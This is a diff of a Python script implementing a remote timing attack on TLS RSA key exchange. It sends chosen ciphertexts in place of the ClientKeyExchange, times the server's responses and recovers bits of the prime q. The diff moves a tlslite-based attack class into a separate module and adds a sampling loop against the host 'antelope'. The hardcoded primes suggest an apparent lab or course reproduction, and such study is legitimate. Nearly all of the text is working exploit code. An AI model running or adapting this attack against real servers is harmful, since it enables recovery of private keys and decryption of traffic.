@@ -1,11 +1,8 @@
-import socket
-import tlslite
 import sympy
-import sample
+import socket
+import tls
+import gc
 
-
-from tlslite.handshakesettings import HandshakeSettings
-from tlslite.constants import CipherSuite
 
 q = sympy.Integer(
     11353860437120204348539420361367294927683441924641720282978666316144621735920188475867378638813811676070362003602263559496393696538309271007870774914687283
@@ -13,150 +10,6 @@ q = sympy.Integer(
 p = sympy.Integer(
     11693128827090800677443535237632476895247105886644942164014088484470194179491435241190389270827811769965853291192455791684691555403909415703633832493911789
 )
-
-
-class RSAKeyExchangeAttack(tlslite.keyexchange.RSAKeyExchange):
-    def __init__(self, cipherSuite, clientHello, serverHello, privateKey, g):
-        super(RSAKeyExchangeAttack, self).__init__(
-            cipherSuite, clientHello, serverHello, privateKey
-        )
-        self.g = g
-
-    def processServerKeyExchange(self, srvPublicKey, serverKeyExchange):
-        """Generate premaster secret for server"""
-        g_bytes = sympy_integer_to_bytes(self.g, length=128)
-        self.encPremasterSecret = g_bytes
-        return g_bytes
-
-
-class AttackTLSConnection(tlslite.TLSConnection):
-    """
-    Modified version of tlslite.TLSConnection which replaces the handshake
-    function with one that sends a predetermined ciphertext, g, instead of
-    the ClientKeyExchange message.
-
-    It also measures the CPU clock cycles taken for the server to
-    respond and returns this value to the caller of
-    performHandshakeAttack().
-    """
-
-    def performHandshakeAttack(self, g):
-        # This function starts a handshake with its server, sending
-        # the <g> instead of the random number in the
-        # ClientKeyExchange message.
-
-        # Setup connection object as a client about to start a handshake:
-        self._handshakeStart(client=True)
-
-        settings = HandshakeSettings()
-        settings = settings.validate()
-
-        self.version = settings.maxVersion
-
-        # TLS handshake/dance:
-        # -> ClientHello
-
-        # Defaults from TLSConnection._handshakeClientAsync()
-        srpUsername = None
-        reqTack = True
-        nextProtos = None
-        serverName = None
-        extensions = None
-
-        # getCertSuites() returns the "plain" RSA cipher suits.
-        cipherSuites = [CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA]
-        certificateTypes = settings.getCertificateTypes()
-
-        # Construct message, then send
-        clientHello = tlslite.messages.ClientHello()
-        clientHello.create(
-            settings.maxVersion,
-            tlslite.utils.cryptomath.getRandomBytes(32),
-            bytearray(0),
-            cipherSuites,
-            certificateTypes,
-            srpUsername,
-            reqTack,
-            nextProtos is not None,
-            serverName,
-            extensions=extensions,
-        )
-
-        for _ in self._sendMsg(clientHello):
-            pass
-
-        # <- ServerHello
-        # <- Certificate
-        # <- ServerHelloDone
-        for serverHello in self._getMsg(
-            tlslite.constants.ContentType.handshake,
-            tlslite.constants.HandshakeType.server_hello,
-        ):
-            pass
-
-        self.version = serverHello.server_version
-
-        if serverHello.cipher_suite not in cipherSuites:
-            raise Exception("Server responded with incorrect ciphersuite")
-        cipherSuite = serverHello.cipher_suite
-
-        if serverHello.certificate_type not in clientHello.certificate_types:
-            raise Exception("Server responded with incorrect certificate type")
-
-        # -> ClientKeyExchange
-        # Start the process as normal...
-        clientCertChain = None
-        privateKey = None
-
-        # <nice code>
-        # keyExchange = tlslite.keyexchange.RSAKeyExchange(
-        #     cipherSuite, clientHello, serverHello, None
-        # )
-        # </nice code>
-
-        # <naughty code>
-        keyExchange = RSAKeyExchangeAttack(
-            cipherSuite, clientHello, serverHello, None, g
-        )
-        # </naughty code>
-
-        # Start time
-        start_time = rdtsc.get_cycles()
-
-        # Continue the process as normal...
-        for result in self._clientKeyExchange(
-            settings,
-            cipherSuite,
-            clientCertChain,
-            privateKey,
-            serverHello.certificate_type,
-            serverHello.tackExt,
-            clientHello.random,
-            serverHello.random,
-            keyExchange,
-        ):
-            pass
-
-        premasterSecret, serverCertChain, clientCertChain, tackExt = result
-
-        try:
-            for result in self._clientFinished(
-                premasterSecret,
-                clientHello.random,
-                serverHello.random,
-                cipherSuite,
-                settings.cipherImplementations,
-                None,
-            ):
-                pass
-
-            masterSecret = result
-
-            return masterSecret, False
-
-        except tlslite.errors.TLSRemoteAlert:
-            end_time = rdtsc.get_cycles()
-            return start_time, end_time
 
 
 def sympy_integer_to_bits(integer, byteorder="big"):
@@ -208,6 +61,22 @@ def bits_to_sympy_integer(bits, byteorder="big"):
     return integer
 
 
+def sample(points, samples):
+    gc.disable()
+
+    for point in points:
+        for iteration in range(samples):
+            gc.collect()
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect(("antelope", 443))
+
+            start_time, response, end_time = tls.handshake_attack(sock, g=point)
+            print(point, end_time - start_time)
+
+            sock.close()
+
+
 def bruteforce_most_significant_bits():
     gs = []
     for h in (0, 1):
@@ -225,7 +94,7 @@ def bruteforce_most_significant_bits():
     gs.append(p)
     gs.append(q)
 
-    sample.sample(gs, 5000)
+    sample(gs, 5000)
 
 
 def recover_bit(known_q_bits, total_bits, N):
